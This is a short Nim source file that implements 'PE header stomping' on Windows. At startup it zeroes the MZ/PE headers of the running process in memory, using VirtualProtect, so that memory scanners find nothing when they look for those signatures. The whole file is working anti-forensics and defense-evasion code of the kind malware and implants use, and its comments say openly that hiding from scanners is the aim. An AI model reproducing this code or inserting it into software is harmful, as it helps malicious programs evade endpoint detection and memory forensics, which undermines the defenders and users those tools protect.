## PE header stomping - zeroes the MZ/PE headers of the current process in
## memory after startup. Memory scanners that look for MZ/PE signatures to
## identify unbacked or suspicious mapped regions find nothing.
## Compile with -d:peStamp to enable at startup.
when defined(windows):
  type
    DWORD  = uint32
    SIZE_T = uint
    BOOL   = int32
    LPVOID = pointer

  const
    PAGE_READWRITE = DWORD(0x04)

  proc VirtualProtect(a: LPVOID, sz: SIZE_T, prot: DWORD, old: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  proc GetModuleHandleA(n: cstring): int
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}

  proc stompPeHeaders*() =
    ## Zero the first 4096 bytes (DOS + PE headers) of the current PE image.
    let base = cast[pointer](GetModuleHandleA(nil))
    if base == nil: return
    var oldProt: DWORD = 0
    if VirtualProtect(base, SIZE_T(4096), PAGE_READWRITE, addr oldProt) == 0:
      return
    zeroMem(base, 4096)
    discard VirtualProtect(base, SIZE_T(4096), oldProt, addr oldProt)
